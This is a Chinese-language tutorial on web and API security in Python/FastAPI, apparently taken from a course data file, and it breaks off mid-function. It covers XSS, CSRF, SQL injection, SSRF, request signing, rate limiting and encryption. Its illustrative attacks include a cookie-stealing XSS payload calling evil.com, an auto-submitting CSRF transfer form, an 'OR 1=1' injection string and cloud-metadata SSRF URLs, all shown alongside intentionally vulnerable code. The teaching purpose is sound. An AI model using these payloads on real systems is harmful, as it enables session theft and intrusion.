# Web安全防护

## 一、XSS跨站脚本攻击

### 1.1 XSS类型

| 类型 | 存储位置 | 触发方式 | 危害 |
|------|---------|---------|------|
| 存储型 | 数据库 | 其他用户访问页面时 | 高（影响所有访问者） |
| 反射型 | URL | 用户点击恶意链接 | 中（影响单个用户） |
| DOM型 | 浏览器DOM | 前端JS直接使用输入 | 中 |

### 1.2 XSS攻击示例

\`\`\`javascript
// 攻击：评论区注入脚本
// 用户提交评论：<script>stealCookies()</script>
// 其他用户查看评论时脚本执行，Cookie被窃取

// 更隐蔽的方式：
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
<a href="javascript:steal()">点击</a>
<svg onload="alert(1)">
\`\`\`

### 1.3 XSS防御

\`\`\`python
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import html
from markupsafe import escape, Markup
import bleach

app = FastAPI()

# 1. 输出转义
@app.get("/greet")
async def greet(name: str):
    # ❌ 危险：直接拼接HTML
    # return HTMLResponse(f"<h1>Hello, {name}!</h1>")

    # ✅ 正确：转义用户输入
    safe_name = html.escape(name)
    return HTMLResponse(f"<h1>Hello, {safe_name}!</h1>")

# 2. 使用模板引擎自动转义（Jinja2）
from fastapi.templating import Jinja2Templates
templates = Jinja2Templates(directory="templates")
# Jinja2默认开启HTML自动转义

# 3. 使用bleach清理富文本（允许部分HTML标签）
def sanitize_html(content: str) -> str:
    """清理HTML，只保留安全标签"""
    allowed_tags = ['b', 'i', 'u', 'p', 'br', 'ul', 'ol', 'li', 'strong', 'em', 'a']
    allowed_attrs = {
        'a': ['href', 'title', 'target'],
    }
    return bleach.clean(
        content,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True
    )

@app.post("/comments")
async def create_comment(content: str):
    # 清理用户提交的富文本
    safe_content = sanitize_html(content)
    save_comment_to_db(safe_content)
    return {"content": safe_content}
\`\`\`

### 1.4 CSP内容安全策略

\`\`\`python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class CSPMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)

        # 严格的CSP策略
        csp_policy = (
            "default-src 'self'; "  # 默认只加载同源
            "script-src 'self' 'nonce-{nonce}'; "  # 脚本只允许同源和带nonce的
            "style-src 'self' 'unsafe-inline'; "  # 样式（内联样式需要unsafe-inline或nonce）
            "img-src 'self' data: https:; "  # 图片允许同源、data URI、HTTPS
            "font-src 'self'; "
            "frame-ancestors 'none'; "  # 禁止被iframe嵌入
            "base-uri 'self'; "
            "form-action 'self'; "
        )

        # 生成nonce（每次请求随机，用于内联脚本白名单）
        import secrets
        nonce = secrets.token_urlsafe(32)
        response.headers["Content-Security-Policy"] = csp_policy.format(nonce=nonce)
        request.state.csp_nonce = nonce

        return response

app.add_middleware(CSPMiddleware)

# 使用nonce的安全内联脚本
@app.get("/page", response_class=HTMLResponse)
async def page(request: Request):
    nonce = request.state.csp_nonce
    return f"""
    <html>
    <head><title>安全页面</title></head>
    <body>
        <script nonce="{nonce}">
            console.log("这个内联脚本是安全的，因为有正确的nonce");
        </script>
        <!-- 没有nonce的内联脚本会被CSP阻止 -->
    </body>
    </html>
    """
\`\`\`

---

## 二、CSRF跨站请求伪造

### 2.1 CSRF攻击原理

\`\`\`
场景：用户登录了银行网站 bank.com
攻击者构造恶意页面 evil.com：

<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

用户访问evil.com时，浏览器自动携带bank.com的Cookie，请求被发送
银行网站看到Cookie，以为是用户操作，执行转账
\`\`\`

### 2.2 CSRF防御

\`\`\`python
import secrets
from fastapi import FastAPI, Request, HTTPException, Response
from starlette.middleware.base import BaseHTTPMiddleware

app = FastAPI()

# 方法1：CSRF Token（传统方式）
CSRF_TOKEN_NAME = "csrftoken"
CSRF_COOKIE_NAME = "csrftoken"
CSRF_HEADER_NAME = "X-CSRF-Token"

def generate_csrf_token() -> str:
    return secrets.token_urlsafe(32)

class CSRFMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # 对于GET/HEAD/OPTIONS请求不做CSRF检查（幂等）
        if request.method in ("GET", "HEAD", "OPTIONS"):
            response = await call_next(request)
            # 确保有CSRF Cookie
            csrf_cookie = request.cookies.get(CSRF_COOKIE_NAME)
            if not csrf_cookie:
                csrf_cookie = generate_csrf_token()
                response.set_cookie(
                    CSRF_COOKIE_NAME,
                    csrf_cookie,
                    httponly=False,  # 需要JS能读取
                    samesite="lax",
                    secure=True
                )
            return response

        # POST/PUT/DELETE等需要CSRF检查
        csrf_cookie = request.cookies.get(CSRF_COOKIE_NAME)
        csrf_header = request.headers.get(CSRF_HEADER_NAME)
        csrf_form = (await request.form()).get(CSRF_TOKEN_NAME)

        submitted_token = csrf_header or csrf_form

        if not csrf_cookie or not submitted_token:
            raise HTTPException(403, "CSRF Token缺失")

        # 时间安全的比较
        import hmac
        if not hmac.compare_digest(csrf_cookie, submitted_token):
            raise HTTPException(403, "CSRF Token无效")

        return await call_next(request)

app.add_middleware(CSRFMiddleware)

# 方法2：SameSite Cookie（更简单）
response.set_cookie(
    "session_id",
    session_id,
    httponly=True,
    secure=True,
    samesite="lax"  # 或 "strict" - 跨站请求不携带Cookie
)
# SameSite=Strict：所有跨站请求都不携带Cookie（最安全，可能影响体验）
# SameSite=Lax：允许导航到目标URL的GET请求携带Cookie（推荐）
# SameSite=None：允许所有跨站（需要Secure）
\`\`\`

---

## 三、SQL注入

### 3.1 SQL注入示例

\`\`\`python
# ❌ 危险：字符串拼接SQL
@app.get("/users")
async def get_users(username: str):
    # 如果 username = "' OR 1=1 --"
    # 生成的SQL: SELECT * FROM users WHERE username = '' OR 1=1 --'
    # 返回所有用户！
    query = f"SELECT * FROM users WHERE username = '{username}'"
    result = db.execute(query)
    return result.fetchall()

# ❌ 同样危险：使用text()但不参数化
from sqlalchemy import text
query = text(f"SELECT * FROM users WHERE username = '{username}'")

# ✅ 正确：使用ORM或参数化查询
# 方式1：ORM（自动参数化）
user = db.query(User).filter(User.username == username).first()

# 方式2：参数化查询
query = text("SELECT * FROM users WHERE username = :username")
result = db.execute(query, {"username": username})
\`\`\`

### 3.2 注入防御

\`\`\`python
# 1. 永远使用ORM或参数化查询
from sqlalchemy.orm import Session

@app.get("/users/search")
async def search_users(keyword: str, db: Session = Depends(get_db)):
    # ✅ ORM方式
    users = db.query(User).filter(
        User.username.like(f"%{keyword}%")
    ).all()

    # ✅ 参数化like
    query = text("SELECT * FROM users WHERE username LIKE :kw")
    users = db.execute(query, {"kw": f"%{keyword}%"}).fetchall()

    return users

# 2. 白名单校验排序/过滤字段
ALLOWED_SORT_FIELDS = {"created_at", "username", "id"}

@app.get("/users")
async def list_users(sort_by: str = "created_at", order: str = "desc"):
    if sort_by not in ALLOWED_SORT_FIELDS:
        raise HTTPException(400, "非法排序字段")
    if order not in ("asc", "desc"):
        raise HTTPException(400, "非法排序方向")

    column = getattr(User, sort_by)
    query = db.query(User).order_by(
        column.desc() if order == "desc" else column.asc()
    )
    return query.all()

# 3. 最小权限数据库账号
# 生产数据库账号只授予必要权限
# 应用账号不应该有DROP、ALTER权限
\`\`\`

---

## 四、SSRF服务器端请求伪造

### 4.1 SSRF攻击原理

服务器端发起请求时，攻击者可以控制目标URL，访问内部资源。

\`\`\`python
# ❌ 危险：用户传入URL，服务器直接访问
@app.get("/fetch")
async def fetch_url(url: str):
    # 攻击者传入：http://169.254.169.254/latest/meta-data/（AWS元数据）
    # 或 http://127.0.0.1:6379/（访问内部Redis）
    async with httpx.AsyncClient() as client:
        response = await client.get(url)
    return response.text
\`\`\`

### 4.2 SSRF防御

\`\`\`python
from urllib.parse import urlparse
import ipaddress
import httpx

# 禁止访问的内网地址
def is_private_ip(hostname: str) -> bool:
    """检查是否为内网IP"""
    import socket
    try:
        ip = socket.gethostbyname(hostname)
        addr = ipaddress.ip_address(ip)
        return (
            addr.is_private or
            addr.is_loopback or
            addr.is_link_local or
            addr.is_reserved or
            addr.is_multicast
        )
    except:
        return True  # 解析失败也拒绝

# URL白名单
ALLOWED_DOMAINS = {"example.com", "api.example.com", "cdn.example.com"}

async def safe_fetch(url: str) -> httpx.Response:
    """安全的URL抓取"""
    parsed = urlparse(url)

    # 检查协议
    if parsed.scheme not in ("http", "https"):
        raise HTTPException(400, "只允许http/https协议")

    # 检查域名白名单
    domain = parsed.hostname.lower()
    if domain not in ALLOWED_DOMAINS:
        raise HTTPException(400, "域名不在白名单中")

    # 额外检查：防止DNS重绑定
    if is_private_ip(domain):
        raise HTTPException(400, "禁止访问内网地址")

    async with httpx.AsyncClient(
        timeout=httpx.Timeout(10.0, connect=5.0),
        follow_redirects=False  # 不跟随重定向（防止重定向到内网）
    ) as client:
        response = await client.get(url)
        return response
\`\`\`

---

## 五、CSRF与XSS组合攻击防御

### 5.1 组合攻击场景

\`\`\`
1. 攻击者找到XSS漏洞注入脚本
2. 通过XSS绕过CSRF保护（因为XSS可以读取CSRF Token）
3. 然后执行任意操作
\`\`\`

### 5.2 纵深防御

\`\`\`python
# 1. 设置安全Cookie
response.set_cookie(
    "session_id",
    session_id,
    httponly=True,    # XSS无法读取Cookie
    secure=True,
    samesite="lax",   # CSRF防护
)

# 2. CSP防止XSS执行
response.headers["Content-Security-Policy"] = "default-src 'self'; ..."

# 3. X-XSS-Protection
response.headers["X-XSS-Protection"] = "1; mode=block"

# 4. X-Content-Type-Options
response.headers["X-Content-Type-Options"] = "nosniff"

# 5. X-Frame-Options（点击劫持）
response.headers["X-Frame-Options"] = "DENY"

# 6. Referrer-Policy
response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

# 7. Permissions-Policy
response.headers["Permissions-Policy"] = "geolocation=(), camera=(), microphone=()"

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        return response
\`\`\`

---

## 六、最佳实践与常见坑点

### 6.1 Web安全检查清单

| 防护 | 必须做 |
|------|--------|
| XSS | 输出转义、CSP、HttpOnly Cookie |
| CSRF | SameSite Cookie、CSRF Token |
| SQL注入 | ORM/参数化查询、白名单 |
| SSRF | URL白名单、禁止内网访问 |
| 点击劫持 | X-Frame-Options/CSP frame-ancestors |
| MIME嗅探 | X-Content-Type-Options: nosniff |
| HTTPS | 全程HTTPS、HSTS |

\`\`\`python
# HSTS（强制HTTPS）
response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
\`\`\`

### 6.2 常见坑点

**坑点1：信任前端验证**

\`\`\`python
# 错误：前端做了校验，后端不做
# 攻击者可以绕过前端直接发请求
@app.post("/transfer")
async def transfer(to_account: str, amount: float):
    # ❌ 没验证金额是否为正数、是否超过余额
    execute_transfer(current_user.id, to_account, amount)

# 正确：后端必须做完整验证
@app.post("/transfer")
async def transfer(to_account: str, amount: float, current_user=Depends(get_current_user)):
    if amount <= 0:
        raise HTTPException(400, "金额必须大于0")
    if amount > current_user.balance:
        raise HTTPException(400, "余额不足")
    if to_account == current_user.account:
        raise HTTPException(400, "不能转账给自己")
    # ... 更多校验
\`\`\`
`
  },
  {
    id: "pyb-15-7",
    group: "认证授权与安全",
    icon: "🔐",
    title: "接口安全",
    content: `

# 接口安全

## 一、接口签名（HMAC）

### 1.1 签名原理

接口签名用于防止请求被篡改和伪造，常见于开放API、支付接口等场景。

\`\`\`
签名流程：
1. 将请求参数按字母排序
2. 拼接成 key1=value1&key2=value2 格式
3. 加上时间戳、nonce等防止重放
4. 使用密钥进行HMAC-SHA256签名
5. 将签名放入Header发送

验签流程：
1. 接收方取出所有参数（除签名本身）
2. 按相同规则排序拼接
3. 使用相同密钥计算签名
4. 对比签名是否一致
\`\`\`

### 1.2 HMAC签名实现

\`\`\`python
import hmac
import hashlib
import time
import secrets
from urllib.parse import urlencode
from fastapi import FastAPI, Request, HTTPException, Header

app = FastAPI()

API_KEYS = {
    "ak_123456": "sk_abcdefghijklmnopqrstuvwxyz",  # 实际从数据库/配置读取
}

def sign_request(
    params: dict,
    api_secret: str,
    timestamp: int = None,
    nonce: str = None,
    method: str = "POST",
    path: str = "/"
) -> tuple[str, int, str]:
    """生成请求签名"""
    timestamp = timestamp or int(time.time())
    nonce = nonce or secrets.token_hex(16)

    # 1. 构建待签名字符串
    sign_data = {
        **params,
        "timestamp": str(timestamp),
        "nonce": nonce,
        "method": method.upper(),
        "path": path,
    }

    # 2. 按key字母排序
    sorted_items = sorted(sign_data.items(), key=lambda x: x[0])

    # 3. 拼接成 query string 格式（注意：value需要URL编码）
    canonical_querystring = urlencode(sorted_items)

    # 4. HMAC-SHA256签名
    signature = hmac.new(
        api_secret.encode("utf-8"),
        canonical_querystring.encode("utf-8"),
        hashlib.sha256
    ).hexdigest()

    return signature, timestamp, nonce

def verify_signature(
    params: dict,
    signature: str,
    api_secret: str,
    timestamp: int,
    nonce: str,
    method: str,
    path: str,
    max_age: int = 300
) -> bool:
    """验证签名"""
    # 检查时间戳是否过期（防止重放）
    now = int(time.time())
    if abs(now - timestamp) > max_age:
        return False

    # 检查nonce是否已使用过（需要Redis存储已用nonce）
    if is_nonce_used(nonce):
        return False
    mark_nonce_used(nonce, ttl=max_age)

    # 重新计算签名
    expected_sig, _, _ = sign_request(
        params, api_secret, timestamp, nonce, method, path
    )

    # 常量时间比较（防止时序攻击）
    return hmac.compare_digest(signature, expected_sig)

# 已使用nonce缓存（Redis）
import redis
r = redis.from_url("redis://localhost:6379/3")

def is_nonce_used(nonce: str) -> bool:
    return bool(r.exists(f"nonce:{nonce}"))

def mark_nonce_used(nonce: str, ttl: int = 300):
    r.setex(f"nonce:{nonce}", ttl, "1")

# FastAPI签名验证依赖
async def verify_api_signature(
    request: Request,
    x_api_key: str = Header(None),
    x_timestamp: int = Header(None),
    x_nonce: str = Header(None),
    x_signature: str = Header(None),
):
    """API签名验证中间件/依赖"""
    if not all([x_api_key, x_timestamp, x_nonce, x_signature]):
        raise HTTPException(401, "缺少签名参数")

    # 获取API Secret
    api_secret = API_KEYS.get(x_api_key)
    if not api_secret:
        raise HTTPException(401, "无效的API Key")

    # 获取请求参数
    params = {}
    if request.method in ("POST", "PUT", "PATCH"):
        try:
            body = await request.json()
            params.update(body)
        except:
            pass
    params.update(dict(request.query_params))

    # 验证签名
    if not verify_signature(
        params=params,
        signature=x_signature,
        api_secret=api_secret,
        timestamp=x_timestamp,
        nonce=x_nonce,
        method=request.method,
        path=request.url.path
    ):
        raise HTTPException(401, "签名验证失败")

    return x_api_key
\`\`\`

### 1.3 客户端调用示例

\`\`\`python
import httpx

API_KEY = "ak_123456"
API_SECRET = "sk_abcdefghijklmnopqrstuvwxyz"
BASE_URL = "http://localhost:8000"

def call_api(method: str, path: str, params: dict = None):
    params = params or {}
    signature, timestamp, nonce = sign_request(
        params, API_SECRET, method=method, path=path
    )

    headers = {
        "X-API-Key": API_KEY,
        "X-Timestamp": str(timestamp),
        "X-Nonce": nonce,
        "X-Signature": signature,
        "Content-Type": "application/json",
    }

    with httpx.Client() as client:
        if method.upper() == "GET":
            resp = client.get(f"{BASE_URL}{path}", params=params, headers=headers)
        else:
            resp = client.post(f"{BASE_URL}{path}", json=params, headers=headers)
        return resp.json()

# 使用
result = call_api("POST", "/api/orders", {"product_id": 1, "quantity": 2})
\`\`\`

---

## 二、防重放攻击

### 2.1 重放攻击防御方案

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| 时间戳 | 请求时间与服务器时间差在允许范围内 | 简单 | 时间窗口内仍可重放 |
| Nonce | 每个请求唯一随机数，用过即失效 | 彻底防重放 | 需要存储nonce |
| 序号 | 请求携带递增序号 | 无额外存储 | 需维护状态、多客户端复杂 |
| 组合方案 | 时间戳+Nonce | 安全且存储压力小 | 实现稍复杂 |

### 2.2 滑动窗口限流+Nonce

\`\`\`python
class ReplayProtection:
    def __init__(self, redis_client, window_seconds: int = 300):
        self.redis = redis_client
        self.window = window_seconds

    async def check_request(self, timestamp: int, nonce: str, api_key: str) -> bool:
        now = int(time.time())

        # 1. 时间戳窗口检查
        if abs(now - timestamp) > self.window:
            return False, "请求时间超出允许范围"

        # 2. Nonce唯一性检查（原子操作）
        nonce_key = f"nonce:{api_key}:{nonce}"
        added = self.redis.set(
            nonce_key,
            str(now),
            ex=self.window,
            nx=True  # 仅当key不存在时设置
        )
        if not added:
            return False, "重复请求"

        return True, "OK"
\`\`\`

---

## 三、接口限流

### 3.1 限流算法对比

| 算法 | 说明 | 优点 | 缺点 |
|------|------|------|------|
| 固定窗口 | 固定时间窗口内计数 | 简单 | 窗口边界突发流量 |
| 滑动窗口 | 滑动时间窗口计数 | 平滑 | 实现稍复杂 |
| 漏桶 | 请求进入漏桶，匀速流出 | 平滑流量 | 无法应对突发 |
| 令牌桶 | 固定速率放令牌，请求取令牌 | 允许一定突发 | 实现复杂 |

### 3.2 Redis限流实现

\`\`\`python
import time
from fastapi import Request, HTTPException

class RateLimiter:
    def __init__(self, redis_client):
        self.redis = redis_client

    async def is_allowed(
        self,
        key: str,
        limit: int,
        window_seconds: int
    ) -> tuple[bool, int, int]:
        """
        滑动窗口限流
        返回: (是否允许, 剩余次数, 重置时间)
        """
        now = int(time.time())
        window_start = now - window_seconds

        pipe = self.redis.pipeline()
        # 移除窗口外的记录
        pipe.zremrangebyscore(key, 0, window_start)
        # 统计窗口内请求数
        pipe.zcard(key)
        # 添加当前请求
        pipe.zadd(key, {str(now): now})
        # 设置过期时间
        pipe.expire(key, window_seconds)
        results = pipe.execute()

        current_count = results[1]
        remaining = limit - current_count - 1

        if current_count >= limit:
            # 获取最早请求时间，计算重置时间
            oldest = self.redis.zrange(key, 0, 0, withscores=True)
            reset_time = int(oldest[0][1]) + window_seconds if oldest else now + window_seconds
            return False, 0, reset_time

        return True, max(0, remaining), now + window_seconds

# 多维度限流
limiter = RateLimiter(r)

async def rate_limit(
    request: Request,
    api_key: str = Depends(verify_api_signature)
):
    # IP级别限流：每分钟60次
    ip = request.client.host
    allowed, remaining, reset = await limiter.is_allowed(
        f"rl:ip:{ip}", limit=60, window_seconds=60
    )
    if not allowed:
        raise HTTPException(
            429,
            "请求过于频繁",
            headers={"Retry-After": str(reset - int(time.time()))}
        )

    # 用户/API Key级别限流：每分钟600次
    allowed, remaining, reset = await limiter.is_allowed(
        f"rl:key:{api_key}", limit=600, window_seconds=60
    )
    if not allowed:
        raise HTTPException(429, "API调用超限")

    # 接口级别限流可以在路由中单独配置
    return True

# 使用
@app.post("/api/orders", dependencies=[Depends(rate_limit)])
async def create_order():
    pass

# 特定接口限流
def limit(limit: int, window: int):
    async def _limit(request: Request):
        key = f"rl:path:{request.url.path}"
        allowed, remaining, reset = await limiter.is_allowed(key, limit, window)
        if not allowed:
            raise HTTPException(429, "该接口请求超限")
    return _limit

@app.post("/api/sms", dependencies=[Depends(limit(5, 60))])  # 短信接口每分钟5次
async def send_sms():
    pass
\`\`\`

---

## 四、敏感数据加密

### 4.1 传输加密（HTTPS）

\`\`\`python
# 强制HTTPS中间件
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from fastapi.responses import RedirectResponse

class HTTPSRedirectMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if request.url.scheme != "https":
            # 检查是否在反向代理后（通过X-Forwarded-Proto）
            if request.headers.get("X-Forwarded-Proto") != "https":
                url = request.url.replace(scheme="https")
                return RedirectResponse(url, status_code=301)
        return await call_next(request)

# HSTS配置
response.headers["Strict-Transport-Security"] = (
    "max-age=31536000; includeSubDomains; preload"
)
\`\`\`

### 4.2 存储加密

\`\`\`python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

# 生成密钥（仅在首次使用时）
# key = Fernet.generate_key()
# 从环境变量获取密钥
SECRET_KEY = os.environ.get("ENCRYPTION_KEY", Fernet.generate_key())

fernet = Fernet(SECRET_KEY)

def encrypt_data(plaintext: str) -> str:
    """加密敏感数据"""
    return fernet.encrypt(plaintext.encode()).decode()

def decrypt_data(ciphertext: str) -> str:
    """解密数据"""
    return fernet.decrypt(ciphertext.encode()).decode()

# 从密码派生密钥（用户级加密）
def derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:
    salt = salt or os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key, salt

# 使用示例
class UserData(Base):
    __tablename__ = "user_data"
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer, nullable=False)
    # 加密存储敏感字段
    id_card_encrypted = Column(String(500))
    phone_encrypted = Column(String(500))
    # 随机salt用于密钥派生
    encryption_salt = Column(LargeBinary(16))

    def set_sensitive(self, field: str, value: str, user_password: str = None):
        """设置敏感字段（加密）"""
        key, salt = derive_key_from_password(user_password or SECRET_KEY.decode())
        f = Fernet(key)
        encrypted = f.encrypt(value.encode()).decode()
        setattr(self, f"{field}_encrypted", encrypted)
        if user_password:
            self.encryption_salt = salt

    def get_sensitive(self, field: str, user_password: str = None) -> str:
        """读取敏感字段（解密）"""
        encrypted = getattr(self, f"{field}_encrypted")
        if not encrypted:
            return None
        key, _ = derive_key_from_password(
            user_password or SECRET_KEY.decode(),
            self.encryption_salt
        )
        f = Fernet(key)
        return f.decrypt(encrypted.encode()).decode()
\`\`\`

---

## 五、接口审计日志

### 5.1 审计日志实现

\`\`\`python
import json
import time
from datetime import datetime
from fastapi import Request, Response
from starlette.middleware.base import BaseHTTPMiddleware
from sqlalchemy import Column, Integer, String, DateTime, Text, Float
from database import Base

class AuditLog(Base):
    __tablename__ = "audit_logs"

    id = Column(Integer, primary_key=True)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    user_id = Column(Integer, index=True, nullable=True)
    ip_address = Column(String(45))
    method = Column(String(10))
    path = Column(String(500))
    query_string = Column(Text)
    request_body = Column(Text)  # 注意脱敏
    status_code = Column(Integer)
    response_time_ms = Column(Float)
    user_agent = Column(String(500))
    request_id = Column(String(64), unique=True)

class AuditLogMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, db_session_factory, sensitive_fields=None):
        super().__init__(app)
        self.db_factory = db_session_factory
        self.sensitive_fields = sensitive_fields or {
            "password", "token", "secret", "credit_card",
            "id_card", "phone", "email", "authorization"
        }

    def mask_sensitive(self, data):
        """脱敏敏感数据"""
        if isinstance(data, dict):
            return {
                k: "***" if k.lower() in self.sensitive_fields
                else self.mask_sensitive(v)
                for k, v in data.items()
            }
        elif isinstance(data, list):
            return [self.mask_sensitive(item) for item in data]
        return data

    async def dispatch(self, request: Request, call_next):
        request_id = request.headers.get("X-Request-ID", secrets.token_hex(16))
        request.state.request_id = request_id

        start_time = time.time()

        # 读取请求体（注意：需要重新封装，因为body只能读一次）
        request_body = None
        if request.method in ("POST", "PUT", "PATCH"):
            body_bytes = await request.body()
            async def receive():
                return {"type": "http.request", "body": body_bytes}
            request._receive = receive
            try:
                body_json = json.loads(body_bytes)
                request_body = json.dumps(self.mask_sensitive(body_json))
            except:
                request_body = body_bytes.decode("utf-8", errors="ignore")[:1000]

        # 获取用户ID（需要提前注入认证中间件）
        user_id = getattr(request.state, "user_id", None)

        response = await call_next(request)

        # 记录日志
        response_time = (time.time() - start_time) * 1000

        # 异步记录日志（不阻塞响应）
        db = self.db_factory()
        try:
            log = AuditLog(
                user_id=user_id,
                ip_address=request.client.host,
                method=request.method,
                path=request.url.path,
                query_string=str(request.url.query),
                request_body=request_body,
                status_code=response.status_code,
                response_time_ms=round(response_time, 2),
                user_agent=request.headers.get("User-Agent", "")[:500],
                request_id=request_id,
            )
            db.add(log)
            db.commit()
        except:
            db.rollback()
        finally:
            db.close()

        response.headers["X-Request-ID"] = request_id
        return response
\`\`\`

---

## 六、最佳实践与常见坑点

### 6.1 接口安全检查清单

| 安全措施 | 适用场景 |
|---------|---------|
| HTTPS传输 | 所有接口 |
| 接口签名(HMAC) | 开放API、支付回调 |
| Timestamp+Nonce防重放 | 所有写操作接口 |
| 限流(IP/用户/接口级别) | 所有公开接口 |
| 敏感数据存储加密 | 身份证、银行卡等 |
| 审计日志 | 关键操作（支付、修改数据） |
| 请求ID追踪 | 所有接口（便于排查问题） |
| 参数校验 | 所有输入 |

### 6.2 常见坑点

**坑点1：使用普通字符串比较签名**

\`\`\`python
# 错误：普通==比较存在时序攻击风险
if computed_signature == received_signature:
    pass

# 正确：使用hmac.compare_digest常量时间比较
import hmac
if hmac.compare_digest(computed_signature, received_signature):
    pass
\`\`\`

**坑点2：限流key设计不合理**

\`\`\`python
# 错误：只用IP限流，NAT后大量用户共享IP会误杀
key = f"rl:{request.client.host}"

# 正确：多维度限流（IP+用户ID+接口）
user_id = getattr(request.state, "user_id", "anonymous")
key = f"rl:{request.client.host}:{user_id}:{request.url.path}"
\`\`\`
`
  },
  {
    id: "pyb-15-8",
    group: "认证授权与安全",
    icon: "🔐",
    title: "Python加密与安全",
    content: `

# Python加密与安全

## 一、cryptography库

### 1.1 cryptography简介

cryptography是Python"官方推荐"的加密库，分为两层：
- \`cryptography.fernet\`：高层API，简单易用
- \`cryptography.hazmat\`：底层加密原语（需谨慎使用）

\`\`\`bash
pip install cryptography
\`\`\`

### 1.2 Fernet对称加密

Fernet是AES 128 CBC + PKCS7填充 + HMAC-SHA256认证的高层封装，保证密文不可篡改。

\`\`\`python
from cryptography.fernet import Fernet

# 1. 生成密钥（妥善保管！丢失则无法解密）
key = Fernet.generate_key()
print(f"密钥: {key.decode()}")
# 密钥格式：urlsafe base64编码的32字节密钥

# 2. 创建Fernet实例
cipher = Fernet(key)

# 3. 加密
message = "这是需要加密的敏感数据".encode("utf-8")
token = cipher.encrypt(message)
print(f"密文: {token.decode()}")
# 输出类似: gAAAAABhxxxx...（Base64编码，包含IV、密文、HMAC）

# 4. 解密
try:
    decrypted = cipher.decrypt(token)
    print(f"明文: {decrypted.decode('utf-8')}")
except Exception as e:
    print(f"解密失败（密钥错误或数据被篡改）: {e}")

# 5. 带密码的密钥派生
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

def key_from_password(password: str, salt: bytes = None) -> tuple[Fernet, bytes]:
    """从用户密码派生加密密钥"""
    salt = salt or os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=480000,  # OWASP推荐迭代次数
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return Fernet(key), salt

# 使用
password = "user_password_123"
cipher, salt = key_from_password(password)
# salt需要和密文一起存储，解密时用同一个salt
token = cipher.encrypt(b"secret data")
# 解密时：
cipher2, _ = key_from_password(password, salt)
plaintext = cipher2.decrypt(token)
\`\`\`

---

## 二、哈希算法（hashlib）

### 2.1 常用哈希函数对比

| 算法 | 输出长度 | 安全性 | 用途 |
|------|---------|--------|------|
| MD5 | 128bit | ❌ 已破解 | 文件校验（非安全场景） |
| SHA-1 | 160bit | ❌ 已破解 | Git（非安全场景） |
| SHA-256 | 256bit | ✅ 安全 | 通用哈希、区块链 |
| SHA-512 | 512bit | ✅ 安全 | 高安全场景 |
| SHA3-256 | 256bit | ✅ 安全（最新标准） | 长期安全 |

### 2.2 hashlib使用

\`\`\`python
import hashlib

# 1. 基本哈希计算
data = "Hello, World!".encode()

md5 = hashlib.md5(data).hexdigest()
sha256 = hashlib.sha256(data).hexdigest()
sha512 = hashlib.sha512(data).hexdigest()

# 2. 大文件分块哈希（避免内存溢出）
def hash_file(filepath: str, algorithm="sha256") -> str:
    h = hashlib.new(algorithm)
    with open(filepath, "rb") as f:
        while chunk := f.read(8192):  # 8KB分块
            h.update(chunk)
    return h.hexdigest()

# 3. HMAC（带密钥的哈希，用于消息认证）
import hmac

def hmac_sha256(key: bytes, message: bytes) -> str:
    return hmac.new(key, message, hashlib.sha256).hexdigest()

# 用于API签名（如前一节）
signature = hmac_sha256(b"secret_key", b"param1=value1&param2=value2")
\`\`\`

---

## 三、对称加密（AES）

### 3.1 AES模式对比

| 模式 | 是否需要IV | 是否认证 | 推荐 |
|------|-----------|---------|------|
| ECB | 否 | 否 | ❌ 不安全 |
| CBC | 是 | 否（需配合HMAC） | ⚠️ 需正确使用 |
| CTR | 是 | 否（需配合HMAC） | ⚠️ 需正确使用 |
| GCM | 是 | ✅ 内置认证 | ✅ 推荐 |
| ChaCha20-Poly1305 | 是(nonce) | ✅ 内置认证 | ✅ 推荐（无AES-NI时） |

### 3.2 AES-GCM实现

\`\`\`python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt_aes_gcm(plaintext: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:
    """
    AES-GCM加密
    返回: (nonce, ciphertext, tag)
    """
    if key is None:
        key = AESGCM.generate_key(bit_length=256)  # 256位密钥

    aesgcm = AESGCM(key)
    nonce = os.urandom(12)  # GCM推荐12字节nonce
    ciphertext_with_tag = aesgcm.encrypt(nonce, plaintext, associated_data=None)

    # GCM的tag附加在密文末尾16字节
    ciphertext = ciphertext_with_tag[:-16]
    tag = ciphertext_with_tag[-16:]

    return nonce, ciphertext, tag, key

def decrypt_aes_gcm(nonce: bytes, ciphertext: bytes, tag: bytes, key: bytes) -> bytes:
